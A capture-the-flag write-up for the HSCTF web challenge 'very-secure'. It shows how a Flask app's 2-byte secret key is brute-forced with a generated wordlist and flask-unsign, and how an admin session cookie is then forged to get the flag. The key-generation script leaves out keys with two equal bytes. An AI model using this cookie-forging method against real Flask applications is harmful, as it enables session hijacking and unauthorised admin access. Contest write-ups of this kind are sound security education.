# Very Secure

## Description

web/very-secure (by _____) | 439  points

this website is obviously 100% secure

Website: [http://very-secure.hsctf.com/](http://very-secure.hsctf.com/)

File: [very-secure.zip](https://hsctf-10-resources.storage.googleapis.com/uploads/c42f4fd42b991b8429385b1ee1d51c436bdda9d4513ccc8708bebfc685126363/very-secure.zip)

## Analysis

Website is an empty placeholder for content. 

If we take a look inside zip we can find the source code for application.

```py
from flask import Flask, render_template, session
import os

app = Flask(__name__)
SECRET_KEY = os.urandom(2)
app.config['SECRET_KEY'] = SECRET_KEY
FLAG = open("flag.txt", "r").read()

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/flag')
def get_flag():
    if "name" not in session:
        session['name'] = "user"
    is_admin = session['name'] == "admin"
    return render_template("flag.html", flag=FLAG, admin = is_admin)

if __name__ == '__main__':
    app.run()
``` 

Flag is located at `/flag` but we need `admin` privileges. privilege is checked from session (cookie). So we have to decode the cookie, change the value, encode and replace.

## Solution

 First I generated all possible keys which `os.urandom(2)` can generate.
```py
from itertools import permutations

i=0
with open("keys", "wb") as f:
    for perm in permutations(range(256), 2):
        f.write(bytearray(perm) + b'\n') # <-- Byte + Byte + NewLine
        print(f"> {i}", end='\r') # Verbosity
        i += 1
    print(f"> Total Permutation: {i}")
```

After that I used ***[flask-unsign](https://pypi.org/project/flask-unsign/)*** to get the secret key.

```sh
└─$ flask-unsign --wordlist ./keys \
                 --cookie 'eyJuYW1lIjoidXNlciJ9.ZH349A.jQk3KOPjom-FKwZ_GP3YbIghuNg' \
                 --unsign \
                 --no-literal-eval
[*] Session decodes to: {'name': 'user'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 29056 attempts
b'p6'
```

Forge new key
```sh
└─$ flask-unsign --sign --cookie '{"name":"admin"}' --secret "p6"                                                        
eyJuYW1lIjoiYWRtaW4ifQ.ZH4lnA.GsW8WfuPW2L_4NS_9oLsNhOu2rU
```

Change cookie value -> Visit `/flag` -> Submit